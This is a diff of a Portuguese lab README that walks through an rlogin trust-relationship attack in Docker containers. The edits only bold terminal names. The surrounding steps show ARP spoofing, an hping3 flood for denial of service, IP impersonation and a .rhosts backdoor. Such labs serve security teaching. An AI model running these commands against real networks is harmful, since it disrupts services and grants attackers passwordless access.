@@ -77,7 +77,7 @@ Cada etapa será abordada em detalhes a seguir.
     docker exec -it victim bash
     ```
 
-    Para explorar a relação de confiança entre o trusted_server e o x-terminal, execute o seguinte comando no terminal do trusted_server:
+    Para explorar a relação de confiança entre o trusted_server e o x-terminal, execute o seguinte comando no **terminal do trusted_server:**
 
     ```bash
     rlogin -l fontoura x-terminal
@@ -85,7 +85,7 @@ Cada etapa será abordada em detalhes a seguir.
 
     Isso fará com que o usuário fontoura seja logado no x-terminal sem a necessidade de uma senha.
 
-    Agora, para verificar que o x-terminal não pode ser acessado por outras máquinas, execute o seguinte comando no terminal do attacker:
+    Agora, para verificar que o x-terminal não pode ser acessado por outras máquinas, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     rlogin -l fontoura x-terminal
@@ -99,7 +99,7 @@ Cada etapa será abordada em detalhes a seguir.
 
 3. **Realizando o arp spoofing**
 
-    Para realizar o arp spoofing, execute o seguinte comando no terminal do attacker:
+    Para realizar o arp spoofing, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     arpspoof -i eth0 -t 172.28.1.2 172.28.1.3
@@ -107,7 +107,7 @@ Cada etapa será abordada em detalhes a seguir.
 
     O comando acima faz com que o attacker se passe pelo trusted_server para o x-terminal. Envenenando a tabela arp do x-terminal.
 
-    É possível verificar que o arp spoofing foi realizado com sucesso executando o seguinte comando no terminal do x-terminal:
+    É possível verificar que o arp spoofing foi realizado com sucesso executando o seguinte comando no **terminal do x-terminal**:
 
     ```bash
     arp -a
@@ -117,7 +117,7 @@ Cada etapa será abordada em detalhes a seguir.
 
 4. **Realizando a negação de serviço**
 
-    Para realizar a negação de serviço, execute o seguinte comando no terminal do attacker:
+    Para realizar a negação de serviço, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     hping3 --flood --rand-source 172.28.1.3
@@ -127,7 +127,7 @@ Cada etapa será abordada em detalhes a seguir.
 
 5. **Realizando a personificação**
 
-    Para realizar a personificação, iremos mudar o IP do attacker para o IP do trusted_server. Para isso, execute o seguinte comando no terminal do attacker:
+    Para realizar a personificação, iremos mudar o IP do attacker para o IP do trusted_server. Para isso, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     ifconfig eth0 172.28.1.3
@@ -147,7 +147,7 @@ Cada etapa será abordada em detalhes a seguir.
 
 7. **configurando o backdoor**
 
-    Para abrir a conexão através do rlogin ao x-terminal para o attacker, execute o seguinte comando no terminal do x-terminal:
+    Para abrir a conexão através do rlogin ao x-terminal para o attacker, execute o seguinte comando no **terminal do x-terminal**:
 
     ```bash
     echo '172.28.1.4 root' >> /home/fontoura/.rhosts
@@ -157,13 +157,13 @@ Cada etapa será abordada em detalhes a seguir.
 
 8. **Conclusão**
 
-    Com o backdoor configurado, podemos retornar o IP do attacker para o seu IP original. Para isso, execute o seguinte comando no terminal do attacker:
+    Com o backdoor configurado, podemos retornar o IP do attacker para o seu IP original. Para isso, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     ifconfig eth0 172.28.1.4
     ```
 
-    Para verificar que o backdoor está funcionando, execute o seguinte comando no terminal do attacker:
+    Para verificar que o backdoor está funcionando, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     rlogin -l fontoura x-terminal
@@ -171,7 +171,7 @@ Cada etapa será abordada em detalhes a seguir.
 
     Se o backdoor estiver funcionando, o usuário fontoura será logado no x-terminal sem a necessidade de uma senha.
 
-    Para conferir que os pacotes não estão passando pelo trusted_server, execute o seguinte comando no terminal do attacker:
+    Para conferir que os pacotes não estão passando pelo trusted_server, execute o seguinte comando no **terminal do attacker:**
 
     ```bash
     tcpdump -i eth0 tcp port 513
